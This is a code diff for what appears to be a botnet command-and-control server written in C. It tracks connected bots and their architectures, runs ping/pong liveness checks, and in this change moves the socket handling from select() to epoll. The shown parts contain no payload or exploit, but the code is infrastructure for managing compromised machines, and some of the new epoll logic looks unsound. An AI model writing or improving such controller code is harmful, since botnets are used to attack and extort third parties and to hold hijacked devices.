@@ -9,7 +9,8 @@
 #include <netinet/tcp.h>
 #include <errno.h>
 #include <sys/time.h>
-//file replaced
+#include <sys/epoll.h>
+
 Bot bots[MAX_BOTS];
 int bot_count = 0;
 int global_cooldown = 0;
@@ -40,39 +41,53 @@ void* handle_bot(void* arg) {
     setsockopt(bot_socket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
     setsockopt(bot_socket, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
 
+    static int epoll_fd = -1;
+    if (epoll_fd == -1) {
+        epoll_fd = epoll_create1(0);
+    }
+    struct epoll_event ev;
+    ev.events = EPOLLIN;
+    ev.data.fd = bot_socket;
+    epoll_ctl(epoll_fd, EPOLL_CTL_ADD, bot_socket, &ev);
+
     char buffer[MAX_COMMAND_LENGTH] = {0};
     ssize_t len;
     while (1) {
-        memset(buffer, 0, sizeof(buffer));
-        len = recv(bot_socket, buffer, sizeof(buffer) - 1, 0);
-        if (len <= 0) {
-            if (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR) {
+        struct epoll_event events[1];
+        int nfds = epoll_wait(epoll_fd, events, 1, 30000);
+        if (nfds > 0 && events[0].data.fd == bot_socket) {
+            memset(buffer, 0, sizeof(buffer));
+            len = recv(bot_socket, buffer, sizeof(buffer) - 1, 0);
+            if (len <= 0) {
+                if (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR) {
+                    continue;
+                }
+                break;
+            }
+            buffer[len] = 0;
+            
+            if (strncmp(buffer, "ping", 4) == 0) {
+                char pong[64];
+                snprintf(pong, sizeof(pong), "pong %s", bots[bot_index].arch);
+                if (send(bot_socket, pong, strlen(pong), MSG_NOSIGNAL) < 0) {
+                    if (errno != EAGAIN && errno != EWOULDBLOCK && errno != EINTR) {
+                        break;
+                    }
+                }
                 continue;
             }
-            break;
-        }
-        buffer[len] = 0;
-        
-        if (strncmp(buffer, "ping", 4) == 0) {
-            char pong[64];
-            snprintf(pong, sizeof(pong), "pong %s", bots[bot_index].arch);
-            if (send(bot_socket, pong, strlen(pong), MSG_NOSIGNAL) < 0) {
-                if (errno != EAGAIN && errno != EWOULDBLOCK && errno != EINTR) {
+            
+            int valid = 1;
+            for (ssize_t i = 0; i < len; i++) {
+                if ((unsigned char)buffer[i] < 0x09 || ((unsigned char)buffer[i] > 0x0D && (unsigned char)buffer[i] < 0x20) || (unsigned char)buffer[i] > 0x7E) {
+                    valid = 0;
                     break;
                 }
             }
-            continue;
+            if (!valid) break;
         }
-        
-        int valid = 1;
-        for (ssize_t i = 0; i < len; i++) {
-            if ((unsigned char)buffer[i] < 0x09 || ((unsigned char)buffer[i] > 0x0D && (unsigned char)buffer[i] < 0x20) || (unsigned char)buffer[i] > 0x7E) {
-                valid = 0;
-                break;
-            }
-        }
-        if (!valid) break;
     }
+    epoll_ctl(epoll_fd, EPOLL_CTL_DEL, bot_socket, NULL);
     pthread_mutex_lock(&bot_mutex);
     bots[bot_index].is_valid = 0;
     pthread_mutex_unlock(&bot_mutex);
@@ -216,6 +231,11 @@ void* bot_listener(void* arg) {
 void* ping_bots(void* arg) {
     char pongbuf[64];
     struct timeval last_ping = {0};
+    static int epoll_fd = -1;
+    if (epoll_fd == -1) {
+        epoll_fd = epoll_create1(0);
+    }
+    struct epoll_event ev, events[MAX_BOTS];
     
     while (1) {
         struct timeval now;
@@ -254,33 +274,43 @@ void* ping_bots(void* arg) {
                 continue;
             }
             
-            fd_set readfds;
-            struct timeval tv;
-            FD_ZERO(&readfds);
-            FD_SET(bots[i].socket, &readfds);
-            tv.tv_sec = 2;
-            tv.tv_usec = 0;
+            ev.events = EPOLLIN;
+            ev.data.fd = bots[i].socket;
+            epoll_ctl(epoll_fd, EPOLL_CTL_ADD, bots[i].socket, &ev);
+        }
+        
+        int nfds = epoll_wait(epoll_fd, events, bot_count, 2000);
+        for (int n = 0; n < nfds; n++) {
+            int fd = events[n].data.fd;
             memset(pongbuf, 0, sizeof(pongbuf));
-            
-            if (select(bots[i].socket + 1, &readfds, NULL, NULL, &tv) > 0) {
-                ssize_t ponglen = recv(bots[i].socket, pongbuf, sizeof(pongbuf)-1, MSG_DONTWAIT);
-                if (ponglen < 0 && (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR)) {
-                    if (current_pos != i) {
-                        bots[current_pos] = bots[i];
+            ssize_t ponglen = recv(fd, pongbuf, sizeof(pongbuf)-1, MSG_DONTWAIT);
+            for (int i = 0; i < bot_count; i++) {
+                if (bots[i].socket == fd && bots[i].is_valid) {
+                    if (ponglen > 0 && strncmp(pongbuf, "pong ", 5) == 0) {
+                        if (current_pos != i) {
+                            bots[current_pos] = bots[i];
+                        }
+                        current_pos++;
+                    } else {
+                        close(bots[i].socket);
+                        bots[i].is_valid = 0;
                     }
-                    current_pos++;
-                    continue;
+                    break;
                 }
-                if (ponglen > 0 && strncmp(pongbuf, "pong ", 5) == 0) {
-                    if (current_pos != i) {
-                        bots[current_pos] = bots[i];
-                    }
-                    current_pos++;
-                } else {
-                    close(bots[i].socket);
-                    bots[i].is_valid = 0;
+            }
+            epoll_ctl(epoll_fd, EPOLL_CTL_DEL, fd, NULL);
+        }
+        
+        for (int i = 0; i < bot_count; i++) {
+            if (!bots[i].is_valid) continue;
+            int found = 0;
+            for (int n = 0; n < nfds; n++) {
+                if (events[n].data.fd == bots[i].socket) {
+                    found = 1;
+                    break;
                 }
-            } else {
+            }
+            if (!found) {
                 if (send(bots[i].socket, "", 0, MSG_NOSIGNAL) >= 0) {
                     if (current_pos != i) {
                         bots[current_pos] = bots[i];
